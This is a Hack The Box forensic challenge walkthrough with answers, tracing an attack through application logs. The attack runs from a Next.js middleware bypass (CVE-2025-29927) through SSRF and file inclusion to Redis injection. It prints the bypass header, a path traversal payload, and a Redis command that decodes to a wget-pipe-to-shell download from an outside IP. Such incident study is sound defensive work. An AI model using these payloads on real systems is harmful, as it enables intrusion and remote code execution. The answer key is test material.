

# Theory part:- 
---





# Steps to solve:-
---

1) **Download the file :** wget "https://challenges-cdn.hackthebox.com/sherlocks/easy/NeuroSync-D.zip/..."

2) **Unzip the file:** sudo 7z x NeuroSync.zip
   
	there are 5 files namely: 
	- access.log
	- bci-device.log
	- data-api.log
	- interface.log
	- redis.log
	


### 1) What version of Next.js is the application using?

- In the interface.log you will find the version of Next.js.

#### Answer :- 15.1.0


### 2) What local port is the Next.js-based application running on?

- In the same file you will also find the local port it is using to run the Next.js application.

#### Answer :- 3000

### 3) A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?

- Search the next.js cve 2025 and you will get the answer. 
	 For detail info:-  https://strobes.co/blog/understanding-next-js-vulnerability/

#### Answer :- CVE-2025-29927


### 4) The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?

- In a Next.js application, the `main-app.js` file is typically the first static file an attacker might access to determine the framework version. This is because it is one of the core JavaScript files required for the application to run and is loaded early by the browser during page initialization. The file is publicly accessible under a predictable path (`/_next/static/js/main-app.js`), making it easy to locate. It contains essential framework code, including client-side logic for routing and hydration, which often reflects patterns or function names specific to certain Next.js versions.

#### Answer :- main-app.js


### 5) Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?


#### Answer :- /api/bci/analytics


### 6) How many requests to this endpoint have resulted in an "Unauthorized" response?

- We know that unauthorized status code is 401.
- So, by analyzing the access.log you will find that  `5` requests to the `/api/bci/analytics` endpoint have been made.

#### Answer :- 5


### 7) When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?

- By analyzing the `data-api.log` you will find the successful response received from the vulnerable endpoint. 

#### Answer :- 2025-04-01 11:38:05


### 8) Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?

- In the CVE you will find the find value for the vulnerable header that was used to exploit the vulnerability and to bypass the middleware.

#### Answer :-  x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware


### 9) The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?

- The attacker successfully exploited the **middleware vulnerability** (CVE-2025-29927), which allowed them to **bypass the middleware** and launch an **SSRF (Server-Side Request Forgery)** attack.

SSRF attacks enable an attacker to send crafted requests to internal resources, bypassing firewalls or network access restrictions. Using this method, the attacker was able to perform an **internal port scan**, discovering that an internal API was exposed on **port 4000**.

#### Answer :- 4000


### 10) After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?

- By analyzing the `data-api.log` you will find the endpoint.

#### Answer :- /logs


### 11) When the vulnerable endpoint found was used maliciously for the first time?

-  Again, by analyzing the `data-api.log` you will find the endpoint.

#### Answer :- 2025-04-01 11:39:01


### 12) What is the attack name the endpoint is vulnerable to?

- The `/logs` endpoint was found accessible after bypassing authentication via the middleware vulnerability (CVE-2025-29927). The attacker likely used it to read internal system or application files by passing path traversal payloads (e.g., `../../../../etc/passwd`), indicating a **Local File Inclusion** vulnerability.

#### Answer :- Local File Inclusion


### 13) What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?

- By analyzing the `data-api.log` you will find the file that was targeted the last time the vulnerable endpoint was exploited at (started at 2025-04-01 11:39:24 and log file read successfully at 2025-04-01 11:39:24 ).

#### Answer :- secret.key


### 14) Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?

- By analyzing the `redis.log` you will find the command string.

#### Answer :- OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb


### 15) Once decoded, what is the command?

- By analyzing the `bci-device.log` you will find the command.

#### Answer :- wget http://185.202.2.147/h4Pln4/run.sh -O- | sh